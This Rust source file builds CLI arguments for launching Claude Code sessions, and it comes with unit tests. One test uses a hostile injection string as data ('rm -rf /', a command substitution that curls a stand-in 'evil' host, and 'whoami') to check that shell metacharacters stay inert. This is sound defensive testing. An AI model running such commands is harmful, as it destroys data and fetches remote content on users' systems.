/// Argument construction for launching Claude Code. Arguments are always built as
/// a vector and passed to `Command::args` — prompt text is never concatenated
/// into a shell string (architecture §4, PRD §5.3).
#[derive(Debug, Clone, Default)]
pub struct LaunchOptions {
    pub prompt: String,
    pub model: Option<String>,
    pub output_format: Option<String>,
    pub add_dirs: Vec<String>,
    pub permission_mode: Option<String>,
}

/// Permission modes documented for the CLI. `default` is represented by absence.
const ALLOWED_PERMISSION_MODES: &[&str] =
    &["acceptEdits", "auto", "bypassPermissions", "manual", "dontAsk", "plan"];

/// Build the argument vector for a non-interactive (`--print`) session.
///
/// The prompt is passed as a single positional argument after `--` so that even
/// prompts beginning with `-` or containing shell metacharacters are treated as
/// inert text by the CLI parser, not as flags.
pub fn build_args(opts: &LaunchOptions) -> Vec<String> {
    let mut args: Vec<String> = Vec::new();
    args.push("-p".into());

    let format = opts
        .output_format
        .clone()
        .unwrap_or_else(|| "stream-json".into());
    args.push("--output-format".into());
    args.push(format.clone());

    // Required alongside stream-json so structured session events are emitted.
    if format == "stream-json" {
        args.push("--verbose".into());
    }

    if let Some(model) = opts.model.as_ref().filter(|m| !m.trim().is_empty()) {
        args.push("--model".into());
        args.push(model.clone());
    }

    if let Some(mode) = opts.permission_mode.as_ref() {
        if ALLOWED_PERMISSION_MODES.contains(&mode.as_str()) {
            args.push("--permission-mode".into());
            args.push(mode.clone());
        }
    }

    for dir in &opts.add_dirs {
        if !dir.trim().is_empty() {
            args.push("--add-dir".into());
            args.push(dir.clone());
        }
    }

    args.push("--".into());
    args.push(opts.prompt.clone());
    args
}

/// A session is successful only when the process exits with code 0.
pub fn exit_ok(code: Option<i32>) -> bool {
    code == Some(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn builds_stream_json_args_by_default() {
        let args = build_args(&LaunchOptions {
            prompt: "hello".into(),
            ..Default::default()
        });
        assert_eq!(args[0], "-p");
        assert!(args.contains(&"--output-format".to_string()));
        assert!(args.contains(&"stream-json".to_string()));
        assert!(args.contains(&"--verbose".to_string()));
        assert_eq!(args.last().unwrap(), "hello");
    }

    #[test]
    fn prompt_metacharacters_stay_a_single_argument() {
        let evil = "hello; rm -rf / && $(curl http://evil) `whoami` | cat";
        let args = build_args(&LaunchOptions {
            prompt: evil.into(),
            ..Default::default()
        });
        assert_eq!(args.last().unwrap(), evil);
        // The prompt is one argument, not split or shell-interpreted.
        assert_eq!(args.iter().filter(|a| a.as_str() == evil).count(), 1);
    }

    #[test]
    fn prompt_starting_with_dash_is_after_separator() {
        let args = build_args(&LaunchOptions {
            prompt: "--not-a-flag".into(),
            ..Default::default()
        });
        let sep = args.iter().position(|a| a == "--").unwrap();
        assert_eq!(args[sep + 1], "--not-a-flag");
    }

    #[test]
    fn model_and_add_dirs_are_included() {
        let args = build_args(&LaunchOptions {
            prompt: "x".into(),
            model: Some("sonnet".into()),
            add_dirs: vec!["/tmp/a".into()],
            ..Default::default()
        });
        assert!(args.windows(2).any(|w| w == ["--model", "sonnet"]));
        assert!(args.windows(2).any(|w| w == ["--add-dir", "/tmp/a"]));
    }

    #[test]
    fn invalid_permission_mode_is_ignored() {
        let args = build_args(&LaunchOptions {
            prompt: "x".into(),
            permission_mode: Some("totally-made-up".into()),
            ..Default::default()
        });
        assert!(!args.contains(&"--permission-mode".to_string()));
    }

    #[test]
    fn verbose_not_added_for_text_format() {
        let args = build_args(&LaunchOptions {
            prompt: "x".into(),
            output_format: Some("text".into()),
            ..Default::default()
        });
        assert!(!args.contains(&"--verbose".to_string()));
    }

    #[test]
    fn exit_ok_only_for_zero() {
        assert!(exit_ok(Some(0)));
        assert!(!exit_ok(Some(1)));
        assert!(!exit_ok(None));
    }
}
